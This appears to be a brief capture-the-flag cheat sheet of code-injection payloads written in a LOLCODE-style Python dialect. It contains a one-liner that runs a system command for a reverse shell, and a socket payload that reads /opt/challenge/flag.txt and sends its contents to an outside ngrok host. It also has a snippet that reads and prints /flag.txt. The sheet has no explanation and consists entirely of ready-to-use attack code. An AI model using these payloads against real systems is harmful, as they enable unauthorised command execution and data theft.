## Python lolcode
Simple 
```
IN MAI os GIMME system LIKE exc F CAN HAS exc WIT "revshell"
```
Execute Commands
```
GIMME socket 
GIMME os
sock CAN HAS socket OWN socket THING BTW WIT socket.AF_INET AND socket.SOCK_STREAM! 
host CAN HAS "6.tcp.ngrok.io"
port CAN HAS 11064
data CAN HAS os OWN popen WIT "cat /opt/challenge/flag.txt "! OWN read THING
sock OWN connect WIT WIT host AND port!!
sock OWN send WIT data OWN encode THING !
```
Read a local file
```
F CAN HAS open WIT "/flag.txt"!
S CAN HAS F OWN read THING
VISIBLE S
```